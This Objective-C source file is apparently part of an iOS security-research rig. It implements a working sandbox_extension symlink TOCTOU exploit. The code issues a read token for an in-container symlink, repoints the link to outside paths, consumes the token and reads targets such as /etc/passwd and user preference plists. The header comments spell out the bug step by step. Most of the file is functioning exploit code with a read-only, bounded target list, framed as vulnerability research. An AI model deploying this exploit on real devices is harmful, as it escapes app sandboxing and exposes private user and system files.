//
//  P116SandboxExtTocTou.m — the sandbox_extension NOFOLLOW TOCTOU port. p116.
//  Lum1na-Debug (P007 rig). iOS kernel research (Lum1na).
//
//  Source: speedyfriend433/sandbox_extension-TOCTOU-bug (MIT), pinned
//  50d6377, vendored at ios-xnu-hunt/jb-sources/sandbox_extension-TOCTOU-bug.
//  Upstream header tags "iOS 27.2" = live on the FLEET'S NEWEST build; the
//  agent's byte-verify found _sb_extension machinery in BOTH fleet caches
//  (23F77 + 24A435) and SANDBOX_EXTENSION_NOFOLLOW absent from both.
//
//  THE BUG (in com.Apple.security.sandbox): issue_file resolves the symlink
//  at ISSUE time and stamps the RESOLVED path into the extension record;
//  consume never re-verifies that the access path still matches. So:
//    1. symlink l -> in-container file s
//    2. issue("com.apple.app-sandbox.read", l)   -> token
//    3. unlink l; symlink l -> /etc/...          (OUT of container)
//    4. consume(token) + open(l)                 -> reads the OUT target
//  Deterministic — no race timing (there is no re-resolution to race).
//
//  LAN ROLE: the Stage-B unlock instrument (out-of-container READ receipts;
//  the ANE Stage-B lane is privilege-blocked and this is the honest class
//  answer), plus the negative control (an in-container read through the SAME
//  harness) so the receipt is attributable to the bug, not the harness.
//
//  HONESTY: READ-ONLY. Bounded target list (the writeup's + three fleet
//  extras). No kernel claims, no KWR, no token printing (sensitive-material
//  law: tokens are never logged). One tap per force-quit; fsync per line.
//

#import "P116SandboxExtTocTou.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <unistd.h>
#import <mach/mach.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>

#define P116_BUILD @"p116-sandboxext-toctou-v1"

static NSMutableString *g_log = nil;
static int g_fd = -1;
static void L(NSString *s) {
    if (!g_log) return;
    NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_log appendString:out];
    if (g_fd >= 0) {
        const char *p = out.UTF8String;
        if (p) { (void)write(g_fd, p, strlen(p)); (void)fcntl(g_fd, F_FULLFSYNC); }
    }
}
static void Lf(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    L(line);
}

/* dlsym'd SPIs (the fleet law: dlsym over externs — no link-time dependency) */
typedef char *(*p116_issue_t)(const char *, const char *, uint64_t);
typedef int64_t (*p116_consume_t)(const char *);
typedef void (*p116_release_t)(int64_t);
static p116_issue_t   g_issue;
static p116_consume_t g_consume;
static p116_release_t g_release;

/* one read: issue on symlink->s, swap symlink->out, swap consume, read l.
   Returns bytes read (0 = refused/empty, -1 = issue/consume refused). */
static long p116_read(const char *outPath, const char *s, const char *l, FILE *logfd) {
    (void)logfd;
    unlink(l);
    if (symlink(s, l) != 0) return -1;
    char *tok = g_issue("com.apple.app-sandbox.read", l, 0);
    if (!tok) return -1;
    unlink(l);
    if (symlink(outPath, l) != 0) { memset(tok, 0, strlen(tok)); free(tok); return -1; }
    int64_t h = g_consume(tok);
    memset(tok, 0, strlen(tok));   /* tokens: never logged (sensitive-material law) */
    free(tok);
    if (h <= 0) return -1;

    /* read THROUGH the swapped path l (the consume-authorized path) */
    long total = 0;
    FILE *f = fopen(l, "rb");
    if (f) {
        char buf[512];
        size_t r;
        while ((r = fread(buf, 1, sizeof buf, f)) > 0) {
            total += (long)r;
            if (total == (long)r) {   /* first chunk: print the first 40 chars */
                char head[41]; size_t k = r < 40 ? r : 40;
                memcpy(head, buf, k); head[k] = 0;
                for (size_t z = 0; z < k; z++) if (head[z] < 0x20) head[z] = '.';
                Lf(@"    first40: %s", [NSString stringWithUTF8String:head]);
            }
            if (total > 65536) break;   /* bounded read */
        }
        fclose(f);
    }
    if (g_release) g_release(h);
    return total > 0 ? total : 0;
}

@implementation P116SandboxExtTocTou

+ (NSString *)tap {
    g_log = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([[docs stringByAppendingPathComponent:@"p116_sandboxext_toctou_log.txt"] UTF8String],
                O_CREAT | O_WRONLY | O_TRUNC, 0644);

    Lf(@"=== p116 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P116_BUILD);
    L([LabDeviceProfile identBlock]);
    L(@"[bug law] sandbox_extension_issue_file resolves the symlink at ISSUE and");
    L(@"  stamps the RESOLVED path; consume never enforces SANDBOX_EXTENSION_NOFOLLOW");
    L(@"  (the kernel does not verify the access path matches the token path).");
    L(@"  Deterministic — zero race timing. Upstream: live on iOS 27.2/24B119");
    L(@"  (unpatched by policy); SANDBOX_EXTENSION_NOFOLLOW absent from BOTH fleet caches.");
    L(@"[lanes] out-of-container READ receipts (the Stage-B unlock instrument; the");
    L(@"  ANE Stage-B lane is privilege-blocked — this is the honest class answer).");
    L(@"[honesty] READ-ONLY, bounded target list, tokens never logged, no kernel");
    L(@"  claims. One tap per force-quit; fsync per line.");

    g_issue   = (p116_issue_t)dlsym(RTLD_DEFAULT, "sandbox_extension_issue_file");
    g_consume = (p116_consume_t)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    g_release = (p116_release_t)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (!g_issue || !g_consume) {
        L(@"[-] sandbox_extension_issue_file/consume not dlsym-able — honest stop.");
        goto finish;
    }

    {
        NSString *tmp = [docs stringByAppendingPathComponent:@"p116_work"];
        [[NSFileManager defaultManager] createDirectoryAtPath:tmp
                                  withIntermediateDirectories:YES attributes:nil error:nil];
        const char *s = [tmp stringByAppendingPathComponent:@"s"].UTF8String;
        const char *l = [tmp stringByAppendingPathComponent:@"l"].UTF8String;
        [@("p116-in-container-marker\n") writeToFile:[tmp stringByAppendingPathComponent:@"s"]
                          atomically:YES encoding:NSUTF8StringEncoding error:nil];

        /* control: in-container read through the SAME harness (should work
           regardless of the bug = the harness-alive receipt) */
        long c = p116_read(s, s, l, NULL);
        Lf(@"[CONTROL] in-container  bytes=%ld (%@)", c,
           c > 0 ? @"harness ALIVE" : @"harness DEAD — all verdicts VOID");

        /* the writeup's target list + three fleet extras */
        struct { const char *p; } targets[] = {
            { "/etc/hosts" },
            { "/etc/passwd" },
            { "/etc/services" },
            { "/var/mobile/Library/Preferences/.GlobalPreferences.plist" },
            { "/var/mobile/Library/UserConfigurationProfiles/PublicInfo/PublicEffectiveUserSettings.plist" },
            { "/var/preferences/com.apple.networkd.plist" },
            { "/private/var/db/dyld/dyld_shared_cache_arm64" },   /* existence-only (huge) */
        };
        int wins = 0, refused = 0;
        for (int i = 0; i < (int)(sizeof targets / sizeof targets[0]); i++) {
            long got = p116_read(targets[i].p, s, l, NULL);
            if (got > 0) { wins++; Lf(@"[+] OUT-OF-CONTAINER READ: %s — %ld bytes", targets[i].p, got); }
            else { refused++; Lf(@"[-] refused/empty: %s (kr-class: issue/consume/open rejected — honest)", targets[i].p); }
        }
        unlink(l);

        L(@"=== VERDICT (honest) ===");
        if (c > 0 && wins > 0) {
            Lf(@"SANDBOX-ESCAPE CLASS RECEIPT: %d/%zu out-of-container targets read",
               wins, sizeof targets / sizeof targets[0]);
            L(@"  through an extension issued for an IN-CONTAINER path. bytes =");
            L(@"  evidence of the NOFOLLOW gap; not a kernel claim. hasKread=NO.");
        } else if (c > 0) {
            L(@"harness alive, zero out-of-container reads — the build re-resolves at");
            L(@"  consume (a fixed/unfixed-differs receipt — also valuable, log it).");
        } else {
            L(@"harness DEAD (control failed) — SPI shape/dlsym mismatch on this build;");
            L(@"  no verdict possible this tap.");
        }
        L(@"HONESTY: read-only; tokens never logged; no writes outside the container.");
    }

finish:
    if (g_fd >= 0) { (void)fcntl(g_fd, F_FULLFSYNC); (void)close(g_fd); g_fd = -1; }
    NSString *ret = g_log; g_log = nil;
    return ret;
}

@end